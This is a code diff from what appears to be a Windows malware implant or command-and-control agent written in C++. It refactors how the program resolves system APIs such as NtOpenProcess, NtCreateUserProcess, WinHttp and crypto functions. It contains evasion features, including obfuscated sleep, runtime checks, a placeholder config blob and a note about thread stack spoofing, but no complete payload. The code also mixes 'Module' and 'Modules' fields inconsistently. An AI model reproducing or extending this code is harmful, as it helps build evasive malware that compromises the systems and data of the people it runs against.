@@ -1,7 +1,6 @@
 #include <core/include/base.hpp>
 
 VOID Entrypoint() {
-
 	// EnumSystem()
 	// ParseConfig()
     MainRoutine();
@@ -11,10 +10,8 @@ namespace Main {
     UINT8 DATA_SXN Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
     VOID MainRoutine() {
         static int retry = 0;
-        // TODO: thread stack spoofing
         do {
-            if (!ObfuscateSleep(nullptr, nullptr) ||
-                !RuntimeChecks()) {
+            if (!ObfuscateSleep(nullptr, nullptr) || !RuntimeChecks()) {
                 break;
             }
             if (!CheckTime()) {
@@ -170,11 +167,14 @@ defer:
         return success;
     }
 
-    BOOL ResolveApi() {
+	VOID ResolveApi() {
         // TODO: create separate ResolveApi for loader and payload
-		BOOL success = true;
-
-		(LPVOID)Ctx->Module.Kernbase = FindModuleAddress(KERNELBASE);
+		Ctx->Module.Kernbase 	= LoadLibrary(KERNELBASE);
+		Ctx->Module.Advapi 		= LoadLibrary(ADVAPI);
+		Ctx->Module.Crypt32 	= LoadLibrary(CRYPT32);
+		Ctx->Module.Iphlpapi 	= LoadLibrary(IPHLPAPI);
+		Ctx->Module.Winhttp 	= LoadLibrary(WINHTTP);
+		Ctx->Module.Mscoree 	= LoadLibrary(MSCOREE);
 
 		Ctx->Win32.NtOpenProcess= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENPROCESS);
 		Ctx->Win32.NtCreateUserProcess= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATEUSERPROCESS);
@@ -265,14 +265,6 @@ defer:
 		Ctx->Win32.FreeResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FREERESOURCE);
 		Ctx->Win32.SetProcessValidCallTargets= 				FindExportAddress((LPVOID)Ctx->Modules.Kernbase, SETPROCESSVALIDCALLTARGETS);
 
-		//TODO: these loaded libraries will need mod->base. Everything else can be freed.
-		//x_assertb(ctx->modules.dload.shlwapi  = ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false));
-        //x_assertb(ctx->modules.dload.crypt32  = ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false));
-        //x_assertb(ctx->modules.dload.winhttp  = ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false));
-        //x_assertb(ctx->modules.dload.advapi   = ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false));
-        //x_assertb(ctx->modules.dload.iphlpapi = ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false));
-        //x_assertb(ctx->modules.dload.mscoree  = ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false));
-
 		Ctx->Win32.LookupAccountSidW= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPACCOUNTSIDW);
 		Ctx->Win32.LookupPrivilegeValueA= 					FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPPRIVILEGEVALUEA);
 		Ctx->Win32.AddMandatoryAce= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, ADDMANDATORYACE);
@@ -305,9 +297,6 @@ defer:
 		Ctx->Win32.WinHttpCloseHandle= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPCLOSEHANDLE);
 		Ctx->Win32.CryptStringToBinaryA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTSTRINGTOBINARYA);
 		Ctx->Win32.CryptBinaryToStringA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTBINARYTOSTRINGA);
-
-        defer:
-		return success;
 	}
 
     BOOL ReadConfig() {
